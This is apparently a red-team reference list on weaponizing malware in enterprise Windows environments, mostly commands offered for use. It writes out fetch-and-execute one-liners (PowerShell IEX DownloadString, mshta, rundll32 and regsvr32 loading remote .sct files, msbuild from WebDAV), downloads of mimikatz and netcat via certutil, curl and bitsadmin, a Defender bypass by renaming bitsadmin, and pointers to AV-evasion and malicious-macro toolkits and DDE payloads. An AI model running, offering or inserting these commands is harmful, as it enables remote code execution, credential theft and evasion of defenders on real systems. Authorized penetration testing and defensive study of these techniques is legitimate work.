# Malware Weaponization & Development
A curated list of tools and techniques written from experience in red teaming and weaponization of malware used in enterprise environments. 

## Code Execution Methods / Launchers

The methods outlined below are used to execute payloads on a local machine, hosted from a remote server or ran in memory. 

### Powershell
Endless methods here, lots of obfuscation techniques, just test and choose one that works in your environment
  * [Infoke-Obfuscation Guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide): Infamous Powershell obfuscator by Daniel Bohannon
  * [Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter): Cradle obfuscator by Daniel Bohannon
  * [Powershell without Powershell.exe](https://medium.com/@Bank_Security/how-to-running-powershell-commands-without-powershell-exe-a6a19595f628)
  * [Powershell Download Cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)


Basic example to execute in memory:
```
powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('https://Domain.com/Payload.ps1')
```
Powershell from a WebDAV server:
```
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
[PowerLine](https://github.com/fullmetalcache/PowerLine) - Compile EXE then transfer it to victim machine to execute Powershell commands without Powershell.exe.
It has to be compiled with the scripts you wish to load within the config (i.e. PowerUp.ps1, Invoke-Mimikatz.ps1, etc.).
```
PowerLine.exe -ShowScripts
PowerLine.exe PowerUp "Invoke-AllChecks"
```
  
### Mshta (HTA)
Microsoft binary to execute HTML Application (HTA) files or inline scripts
```
1. mshta vbscript:Close(Execute("GetObject(""script:http://WebServer/payload.sct"")"))
2. mshta http://WebServer/payload.hta
3. mshta \\WebDAVserver\folder\payload.hta
```
  
### Rundll32
Microsoft binary to execute code inside a .DLL file. Custom .DLLs can be written in languages such as Csharp to fully bypass detection. 

  * [Lobas-Project Rundll32 Methods](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/)
  * [Atomic red team Rundll32 payloads](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1085/T1085.md)
```
rundll32 C:\yourfile.dll,EntryPoint 
--> yourfile.dll is your malicious .DLL
--> EntryPoint is the function called within the .DLL
```
Run inline VBscript:
```
rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("Wscript.Echo ""Hi there!"""),0)
```
Run remote SCT payload:
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://WebServer/payload.sct");window.close();
```

### MsBuild
Windows .NET executable for building and executing custom Csharp project files on the fly.
Running local payload XML or Csproj files:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe Payload.xml
```
WebDAV server hosted to run in memory:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\WebDAVserver\Payload.xml
```

### Regsvr32
Windows command-line tool to register and unregister dll files. Can be used to bypass some controls such as AppLocker
  * [Bypass Application Whitelisting using regsrv32.exe (Multiple Methods)](https://www.hackingarticles.in/bypass-application-whitelisting-using-regsrv32-exe-multiple-methods/)

Method 1: Web server delivery. Written on disk in IE local cache.
Command to run on target machine:
```
regsvr32 /u /n /s /i:http://yourdomain.com/payload.sct scrobj.dll
```
Method 2: WebDAV server. Written on disk in WebDAV client local cache.
Command to run on target machine:
```
regsvr32 /u /n /s /i:\\WebDavServer\tmp\payload.sct scrobj.dll
```

### Wmic

### Cscript

### Wscript

---------------------------------------------------------------

## Payload Downloading and Delivery Methods

The methods listed below are used to transfer and download remote files onto target machines.

[Windows oneliners to download remote payload and execute arbitrary code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

### Powershell
The most pervasive method these days which may be monitoried from blue team, logged for later analysis and possibly blocked in some environments. 

[SANS Powershell one-liners](https://www.sans.org/blog/pen-test-poster-white-board-powershell-one-line-web-client/)
```
# DownloadFile method
powershell -c (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "%temp%\archive.zip")

# Invoke-WebRequest method
powershell -c IWR "https://example.com/mimikatz.exe" -OutFile ".\mimikatz.exe" 

# Wget in Powershell (Windows 8 and later)
PS# wget "http://www.yourdomain.com/file.exe" -outfile "OutputFile.exe"
```

### Curl
Linux and Windows 10 (build #17063 and later) operating systems tool to bypass controls
Reference: https://medium.com/@reegun/curl-exe-is-the-new-rundll32-exe-lolbin-3f79c5f35983
```
curl -o nc.exe https://yourdomain.com/nc.exe
```

### Certutil
Windows built-in binary for downloading remote files, encoding and decoding them. Blocked on recent builds of Windows 10 with Defender.
```
certutil -urlcache -f https://download.sysinternals.com/files/PSTools.env pstools.env
certutil -decode pstools.env pstools.zip
```

### Bitsadmin
Windows command-line utility for managing BITS jobs and transferring files.
Blocked by modern Windows 10 Defender but can be copied to another EXE to bypass.
Basic example:
```
bitsadmin /transfer job https://Domain.com/Payload.ps1 Payload.ps1
```
Method to bypass Win 10 Defender by copying "bitsadmin.exe" to a separate file for execution:
```
copy /Y C:\Windows\System32\bitsadmin.exe %temp%\Update.exe
%temp%\Update.exe /transfer newjob https://Domain.com/mimikatz.exe %temp%\mimikatz.exe
```
PowerShell method:
```
PS# Start-BitsTransfer https://Domain.com/mimikatz.exe %temp%\mimikatz.exe
```

---------------------------------------------------------------
## Tool kits
* [Veil Evasion](https://github.com/Veil-Framework/Veil): Generate Metasploit based payloads. Includes payload type and encoding options.
* [Lucky Strike](https://github.com/curi0usJack/luckystrike): PowerShell tool for creating malicious Macro documents. 
* [Shellter](https://www.shellterproject.com/): Automated anti-virus evasion toolkit for payload development.
* [Magic Unicorn](): 

## Red teaming Frameworks
* [Powershell Empire](https://www.powershellempire.com/): Post-exploitation framework built in Powershell for setting up Listeners, receiving connecting Agents, executing payload Modules and more.
* [Cobalt Strike](): Red teaming framework of choice for many professionals. Costly but effective. 
* [Covanent](https://github.com/cobbr/Covenant): Open source framework from the makers of Cobalt Strike. Created in C# (.NET Core). Runs and interacts in a similar fashion to Powershell Empire. 
* [Metasploit](https://www.metasploit.com/): Standard Kali Linux framework, used by hackers, pentesters and script-kiddies alike. 

Weaponizing and delivery
### Dynamic Data Exchange (DDE) 
Macroless payloads in Word and Excel to bypass environment macro restrictions
  * Frequently blocked in Word docs within modern Enterprises but not always within Excel files. 
  * [DDE Payloads](https://medium.com/red-team/dde-payloads-16629f4a2fcd): Various delivery methods on Medium blog from 2018 to create DDE paylods in different tool kits
  * [Office-DDE-Payloads tool](https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads): Python script to create and obfuscate Office DDE payloads
  * [Pentestlab - DDE Attacks](https://pentestlab.blog/2018/01/16/microsoft-office-dde-attacks/)
  * [DDE Payload Obfuscation](https://blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation)
